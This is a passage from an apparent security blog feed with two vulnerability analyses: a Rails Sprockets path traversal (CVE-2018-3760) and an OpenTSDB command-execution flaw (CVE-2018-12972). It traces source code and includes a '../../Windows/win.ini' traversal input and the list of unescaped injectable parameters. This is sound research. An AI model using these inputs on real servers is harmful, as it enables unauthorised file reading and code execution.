class="line"></div><div class="line">在完成了filename解析后，我们回到`load<span class="string">`函数末尾，进入`</span>load_from_unloaded(unloaded)<span class="string">`:</span></div><div class="line">`<span class="string">``</span>ruby</div><div class="line">    <span class="comment"># Internal: Loads an asset and saves it to cache</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># unloaded - An UnloadedAsset</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># This method is only called when the given unloaded asset could not be</span></div><div class="line">    <span class="comment"># successfully pulled from cache.</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load_from_unloaded</span><span class="params">(unloaded)</span></span></div><div class="line">        unless file?(unloaded.filename)</div><div class="line">            raise FileNotFound, <span class="string">"could not find file: <span class="subst">#&#123;unloaded.filename&#125;</span>"</span></div><div class="line">        <span class="keyword">end</span></div><div class="line"></div><div class="line">        load_path, logical_path = paths_split(config[<span class="symbol">:paths</span>], unloaded.filename)</div><div class="line">        unless load_path</div><div class="line">            raise FileOutsidePaths, <span class="string">"<span class="subst">#&#123;unloaded.filename&#125;</span> is no longer under a load path: <span class="subst">#&#123;<span class="keyword">self</span>.paths.join(<span class="string">', '</span>)&#125;</span>"</span></div><div class="line">        <span class="keyword">end</span></div><div class="line">        ....</div></pre></td></tr></table></figure></p>
<p>主要是进行了两个检查：文件是否存在和是否在合规目录里。主要关注第二个检测。其中<code>config[:paths]</code>是允许的路径，而<code>unloaded.filename</code>是请求的路径文件名。跟入 lib/ruby/gems/2.4.0/gems/sprockets-3.7.2/lib/sprockets/path_utils.rb:120：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Internal: Detect root path and base for file in a set of paths.</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># paths    - Array of String paths</span></div><div class="line"><span class="comment"># filename - String path of file expected to be in one of the paths.</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Returns [String root, String path]</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">paths_split</span><span class="params">(paths, filename)</span></span></div><div class="line">    <span class="comment"># 对paths中的每一个 path</span></div><div class="line">    paths.each <span class="keyword">do</span> <span class="params">|path|</span></div><div class="line">    <span class="comment"># 如果subpath不为空</span></div><div class="line">        <span class="keyword">if</span> subpath = split_subpath(path, filename)</div><div class="line">            <span class="comment"># 则返回 path, subpath</span></div><div class="line">            <span class="keyword">return</span> path, subpath</div><div class="line">        <span class="keyword">end</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">    <span class="literal">nil</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>继续跟入<code>split_subpath</code>， lib/ruby/gems/2.4.0/gems/sprockets-3.7.2/lib/sprockets/path_utils.rb:103。假设上面传入的path参数是``。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Internal: Get relative path for root path and subpath.</span></div><div class="line"> <span class="comment">#</span></div><div class="line"> <span class="comment"># path    - String path</span></div><div class="line"> <span class="comment"># subpath - String subpath of path</span></div><div class="line"> <span class="comment">#</span></div><div class="line"> <span class="comment"># Returns relative String path if subpath is a subpath of path, or nil if</span></div><div class="line"> <span class="comment"># subpath is outside of path.</span></div><div class="line"> <span class="function"><span class="keyword">def</span> <span class="title">split_subpath</span><span class="params">(path, subpath)</span></span></div><div class="line">   <span class="keyword">return</span> <span class="string">""</span> <span class="keyword">if</span> path == subpath</div><div class="line">   <span class="comment"># 此时 path 为 C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini</span></div><div class="line">   path = File.join(path, <span class="string">''</span>)</div><div class="line">   <span class="comment"># 此时 path 为 C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini/</span></div><div class="line">   <span class="comment"># 与传入的绝对路径进行比较</span></div><div class="line">   <span class="comment"># 如果以 允许的路径 为开头，则检查通过。</span></div><div class="line">   <span class="keyword">if</span> subpath.start_with?(path)</div><div class="line">     subpath[path.length..-<span class="number">1</span>]</div><div class="line">   <span class="keyword">else</span></div><div class="line">     <span class="literal">nil</span></div><div class="line">   <span class="keyword">end</span></div><div class="line"> <span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>通过检查后，在<code>load_from_unloaded</code>末尾即进行了读取等操作，从而通过路径穿越造成任意文件读取。</p>
<p>如果文件以<code>.erb</code>结尾，则会直接执行：</p>
<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180808122708-4fa451c2-9ac3-1.png" alt="buding.png"></p>
<p>在server.rb中，增加关键字过滤<code>://</code>。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://github.com/rails/sprockets/commit/c09131cf5b2c479263939c8582e22b98ed616c5f" target="_blank" rel="external">https://github.com/rails/sprockets/commit/c09131cf5b2c479263939c8582e22b98ed616c5f</a></li>
<li><a href="https://blog.heroku.com/rails-asset-pipeline-vulnerability" target="_blank" rel="external">https://blog.heroku.com/rails-asset-pipeline-vulnerability</a></li>
<li><a href="https://twitter.com/orange_8361/status/1009309271698300928" target="_blank" rel="external">https://twitter.com/orange_8361/status/1009309271698300928</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2542&quot;&gt;Ruby on Rails 路径穿越与任意文件读取漏洞分析 -【CVE-2018-3760】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="ruby" scheme="http://chybeta.github.io/tags/ruby/"/>
    
      <category term="任意文件读取" scheme="http://chybeta.github.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
      <category term="rails" scheme="http://chybeta.github.io/tags/rails/"/>
    
      <category term="路径穿越" scheme="http://chybeta.github.io/tags/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/"/>
    
  </entry>
  
  <entry>
    <title>OpenTSDB远程命令执行漏洞分析 -【CVE-2018-12972】</title>
    <link href="http://chybeta.github.io/2018/08/11/OpenTSDB%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-12972%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/08/11/OpenTSDB远程命令执行漏洞分析-【CVE-2018-12972】/</id>
    <published>2018-08-11T03:33:13.000Z</published>
    <updated>2018-08-11T03:34:06.514Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2511" target="_blank" rel="external">OpenTSDB远程命令执行漏洞分析 -【CVE-2018-12972】</a><br><a id="more"></a></p>
<h1 id="相关背景"><a href="#相关背景" class="headerlink" title="相关背景"></a>相关背景</h1><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180731225944-5c6989e6-94d2-1.png" alt="3.jpg"></p>
<p>Opentsdb是基于Hbase的分布式的，可伸缩的时间序列数据库。官方提供了一个web界面来提供对查询数据进行可视化分析，其背后的绘图由Gnuplot支持。其Github地址为： <a href="https://github.com/OpenTSDB/opentsdb" target="_blank" rel="external">https://github.com/OpenTSDB/opentsdb</a> 。在某些版本(比如2.3.0，以下分析以2.3.0版本为例)中，其提供的Web接口存在远程命令执行漏洞，一旦利用成功将以root权限执行。分析见下。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在opentsdb中，默认情况下<code>tsd.core.enable_ui</code>开启，允许通过http来进行rpc调用。当访问时<code>/q?xx=xxx</code>时，对应的rpc接口即<code>GraphHandler</code>。见 src/tsd/RpcManager.java:297：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initializeBuiltinRpcs</span><span class="params">(<span class="keyword">final</span> String mode,</span></span></div><div class="line">        <span class="keyword">final</span> ImmutableMap.Builder&lt;String, TelnetRpc&gt; telnet,</div><div class="line">        <span class="keyword">final</span> ImmutableMap.Builder&lt;String, HttpRpc&gt; http) &#123;</div><div class="line">    ...</div><div class="line">      <span class="keyword">if</span> (enableUi) &#123;</div><div class="line">        ...</div><div class="line">        http.put(<span class="string">"q"</span>, <span class="keyword">new</span> GraphHandler());</div><div class="line">        ...</div><div class="line">      &#125;</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<p>在 src/tsd/GraphHandler.java:108 execute中<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(<span class="keyword">final</span> TSDB tsdb, <span class="keyword">final</span> HttpQuery query)</span> </span>&#123;</div><div class="line">   ...</div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">     doGraph(tsdb, query);</div><div class="line">   &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">     query.internalError(e);</div><div class="line">   &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</div><div class="line">     query.badRequest(e.getMessage());</div><div class="line">   &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<p>跟入 <code>doGraph</code><br>其中接受参数在<br>src/tsd/GraphHandler.java:198 doGraph 中：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doGraph</span><span class="params">(<span class="keyword">final</span> TSDB tsdb, <span class="keyword">final</span> HttpQuery query)</span></span></div><div class="line">  <span class="keyword">throws</span> IOException &#123;</div><div class="line">  <span class="keyword">final</span> String basepath = getGnuplotBasePath(tsdb, query);</div><div class="line"></div><div class="line">  <span class="comment">// 获取 start 参数,保证格式正确，否则抛出错误</span></div><div class="line">  <span class="keyword">long</span> start_time = DateTime.parseDateTimeString(</div><div class="line">    query.getRequiredQueryStringParam(<span class="string">"start"</span>),</div><div class="line">    query.getQueryStringParam(<span class="string">"tz"</span>));</div><div class="line"></div><div class="line">  ...</div><div class="line">  <span class="comment">// 获取 end 参数,保证格式正确，否则抛出错误</span></div><div class="line">  <span class="keyword">long</span> end_time = DateTime.parseDateTimeString(</div><div class="line">      query.getQueryStringParam(<span class="string">"end"</span>),</div><div class="line">      query.getQueryStringParam(<span class="string">"tz"</span>)); </div><div class="line">  </div><div class="line">  ...</div><div class="line">  <span class="comment">// 获取 o 参数</span></div><div class="line">  List&lt;String&gt; options = query.getQueryStringParams(<span class="string">"o"</span>);</div><div class="line">  ...</div><div class="line"></div><div class="line">  <span class="keyword">final</span> Plot plot = <span class="keyword">new</span> Plot(start_time, end_time,</div><div class="line">        DateTime.timezones.get(query.getQueryStringParam(<span class="string">"tz"</span>)));</div><div class="line">  <span class="comment">// 设置 plot 维度，无影响，可忽略</span></div><div class="line">  setPlotDimensions(query, plot);</div><div class="line"></div><div class="line">  <span class="comment">// 设置 plot 参数, 下文讲解</span></div><div class="line">  setPlotParams(query, plot);</div><div class="line">  ...</div><div class="line"></div><div class="line">  <span class="keyword">final</span> RunGnuplot rungnuplot = <span class="keyword">new</span> RunGnuplot(query, max_age, plot, basepath,</div><div class="line">          aggregated_tags, npoints);</div><div class="line"></div><div class="line">  ...</div><div class="line"></div><div class="line">  <span class="comment">// Fetch global annotations, if needed</span></div><div class="line">  <span class="keyword">if</span> (...) &#123;</div><div class="line">    ...</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="comment">// 执行画图程序</span></div><div class="line">    execGnuplot(rungnuplot, query);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>从请求中获取对应值并设置plot参数在<code>setPlotParams(query, plot);</code>中完成：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setPlotParams</span><span class="params">(<span class="keyword">final</span> HttpQuery query, <span class="keyword">final</span> Plot plot)</span> </span>&#123;</div><div class="line">  <span class="keyword">final</span> HashMap&lt;String, String&gt; params = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</div><div class="line">  <span class="keyword">final</span> Map&lt;String, List&lt;String&gt;&gt; querystring = query.getQueryString();</div><div class="line">  String value;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"yrange"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"yrange"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"y2range"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"y2range"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"ylabel"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"ylabel"</span>, stringify(value));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"y2label"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"y2label"</span>, stringify(value));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"yformat"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"format y"</span>, stringify(value));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"y2format"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"format y2"</span>, stringify(value));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"xformat"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"format x"</span>, stringify(value));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"ylog"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"logscale y"</span>, <span class="string">""</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"y2log"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"logscale y2"</span>, <span class="string">""</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"key"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"key"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"title"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"title"</span>, stringify(value));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"bgcolor"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"bgcolor"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"fgcolor"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"fgcolor"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"smooth"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"smooth"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"style"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"style"</span>, value);</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// This must remain after the previous `if' in order to properly override</span></div><div class="line">  <span class="comment">// any previous `key' parameter if a `nokey' parameter is given.</span></div><div class="line">  <span class="keyword">if</span> ((value = popParam(querystring, <span class="string">"nokey"</span>)) != <span class="keyword">null</span>) &#123;</div><div class="line">    params.put(<span class="string">"key"</span>, <span class="keyword">null</span>);</div><div class="line">  &#125;</div><div class="line">  plot.setParams(params);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>为方便起见，整理一下http请求参数、java代码、plot参数的对应关系。有一些参数经过了<code>stringify</code>，用于后续的JSON格式的转换。经过<code>stringify</code>的参数都会被双引号包含（见下面的代码），难以后续逃逸使用。还有一些参数直接被设定为空值。这些参数对应如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">http请求参数</th>
<th style="text-align:center">Java代码</th>
<th style="text-align:center">plot参数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ylabel</td>
<td style="text-align:center">put(“ylabel”, stringify(value))</td>
<td style="text-align:center">ylabel</td>
</tr>
<tr>
<td style="text-align:center">y2label</td>
<td style="text-align:center">put(“y2label”, stringify(value))</td>
<td style="text-align:center">y2label</td>
</tr>
<tr>
<td style="text-align:center">yformat</td>
<td style="text-align:center">put(“format y”, stringify(value))</td>
<td style="text-align:center">format y</td>
</tr>
<tr>
<td style="text-align:center">y2format</td>
<td style="text-align:center">put(“format y2”, stringify(value))</td>
<td style="text-align:center">format y2</td>
</tr>
<tr>
<td style="text-align:center">xformat</td>
<td style="text-align:center">put(“format x”, stringify(value))</td>
<td style="text-align:center">format x</td>
</tr>
<tr>
<td style="text-align:center">ylog</td>
<td style="text-align:center">put(“logscale y”, “”)</td>
<td style="text-align:center">logscale y</td>
</tr>
<tr>
<td style="text-align:center">y2log</td>
<td style="text-align:center">put(“logscale y2”, “”)</td>
<td style="text-align:center">logscale y2</td>
</tr>
<tr>
<td style="text-align:center">title</td>
<td style="text-align:center">put(“title”, stringify(value))</td>
<td style="text-align:center">title</td>
</tr>
</tbody>
</table>
</div>
<p><code>stringify</code>定义在 src/tsd/GraphHandler.java:658 ：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">stringify</span><span class="params">(<span class="keyword">final</span> String s)</span> </span>&#123;</div><div class="line">  <span class="keyword">final</span> StringBuilder buf = <span class="keyword">new</span> StringBuilder(<span class="number">1</span> + s.length() + <span class="number">1</span>);</div><div class="line">  buf.append(<span class="string">'"'</span>);</div><div class="line">  HttpQuery.escapeJson(s, buf);  <span class="comment">// Abusing this function gets the job done.</span></div><div class="line">  buf.append(<span class="string">'"'</span>);</div><div class="line">  <span class="keyword">return</span> buf.toString();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>escapeJson</code>定义在 src/tsd/HttpQuery.java:471 中，主要对一些特殊字符进行转义：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">escapeJson</span><span class="params">(<span class="keyword">final</span> String s, <span class="keyword">final</span> StringBuilder buf)</span> </span>&#123;</div><div class="line">  <span class="keyword">final</span> <span class="keyword">int</span> length = s.length();</div><div class="line">  <span class="keyword">int</span> extra = <span class="number">0</span>;</div><div class="line">  <span class="comment">// First count how many extra chars we'll need, if any.</span></div><div class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</div><div class="line">    <span class="keyword">final</span> <span class="keyword">char</span> c = s.charAt(i);</div><div class="line">    <span class="keyword">switch</span> (c) &#123;</div><div class="line">      <span class="keyword">case</span> <span class="string">'"'</span>:</div><div class="line">      <span class="keyword">case</span> <span class="string">'\\'</span>:</div><div class="line">      <span class="keyword">case</span> <span class="string">'\b'</span>:</div><div class="line">      <span class="keyword">case</span> <span class="string">'\f'</span>:</div><div class="line">      <span class="keyword">case</span> <span class="string">'\n'</span>:</div><div class="line">      <span class="keyword">case</span> <span class="string">'\r'</span>:</div><div class="line">      <span class="keyword">case</span> <span class="string">'\t'</span>:</div><div class="line">        extra++;</div><div class="line">        <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (c &lt; <span class="number">0x001F</span>) &#123;</div><div class="line">      extra += <span class="number">4</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> (extra == <span class="number">0</span>) &#123;</div><div class="line">    buf.append(s);  <span class="comment">// Nothing to escape.</span></div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line">  buf.ensureCapacity(buf.length() + length + extra);</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</div><div class="line">    <span class="keyword">final</span> <span class="keyword">char</span> c = s.charAt(i);</div><div class="line">    <span class="keyword">switch</span> (c) &#123;</div><div class="line">      <span class="keyword">case</span> <span class="string">'"'</span>:  buf.append(<span class="string">'\\'</span>).append(<span class="string">'"'</span>);  <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'\\'</span>: buf.append(<span class="string">'\\'</span>).append(<span class="string">'\\'</span>); <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'\b'</span>: buf.append(<span class="string">'\\'</span>).append(<span class="string">'b'</span>);  <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'\f'</span>: buf.append(<span class="string">'\\'</span>).append(<span class="string">'f'</span>);  <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'\n'</span>: buf.append(<span class="string">'\\'</span>).append(<span class="string">'n'</span>);  <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'\r'</span>: buf.append(<span class="string">'\\'</span>).append(<span class="string">'r'</span>);  <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'\t'</span>: buf.append(<span class="string">'\\'</span>).append(<span class="string">'t'</span>);  <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (c &lt; <span class="number">0x001F</span>) &#123;</div><div class="line">      buf.append(<span class="string">'\\'</span>).append(<span class="string">'u'</span>).append(<span class="string">'0'</span>).append(<span class="string">'0'</span>)</div><div class="line">        .append((<span class="keyword">char</span>) Const.HEX[(c &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>])</div><div class="line">        .append((<span class="keyword">char</span>) Const.HEX[c &amp; <span class="number">0x0F</span>]);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      buf.append(c);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>还有一些参数并没有经过转义等，如下表</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">http请求参数</th>
<th style="text-align:center">Java代码</th>
<th style="text-align:center">plot参数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">yrange</td>
<td style="text-align:center">put(“yrange”, value)</td>
<td style="text-align:center">yrange</td>
</tr>
<tr>
<td style="text-align:center">y2range</td>
<td style="text-align:center">put(“y2range”, value)</td>
<td style="text-align:center">y2range</td>
</tr>
<tr>
<td style="text-align:center">key</td>
<td style="text-align:center">put(“key”, value)</td>
<td style="text-align:center">key</td>
</tr>
<tr>
<td style="text-align:center">bgcolor</td>
<td style="text-align:center">put(“bgcolor”, value)</td>
<td style="text-align:center">bgcolor</td>
</tr>
<tr>
<td style="text-align:center">fgcolor</td>
<td style="text-align:center">put(“fgcolor”, value)</td>
<td style="text-align:center">fgcolor</td>
</tr>
<tr>
<td style="text-align:center">smooth</td>
<td style="text-align:center">put(“smooth”, value)</td>
<td style="text-align:center">smooth</td>
</tr>
<tr>
<td style="text-align:center">style</td>
<td style="text-align:center">put(“style”, value)</td>
<td style="text-align:center">style</td>
</tr>
</tbody>
</table>
</div>
<p>在完成参数设置后，创建了一个<code>RunGnuplot</code>对象，其中前面解析到的参数即对应的写入到了<code>plot</code>属性中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">RunGnuplot</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</div><div class="line"></div><div class="line">   <span class="keyword">private</span> <span class="keyword">final</span> HttpQuery query;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> max_age;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">final</span> Plot plot;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">final</span> String basepath;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">final</span> HashSet&lt;String&gt;[] aggregated_tags;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> npoints;</div><div class="line"></div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="title">RunGnuplot</span><span class="params">(<span class="keyword">final</span> HttpQuery query, </span></span></div><div class="line">                     <span class="keyword">final</span> <span class="keyword">int</span> max_age,</div><div class="line">                     <span class="keyword">final</span> Plot plot,</div><div class="line">                     <span class="keyword">final</span> String basepath,</div><div class="line">                     <span class="keyword">final</span> 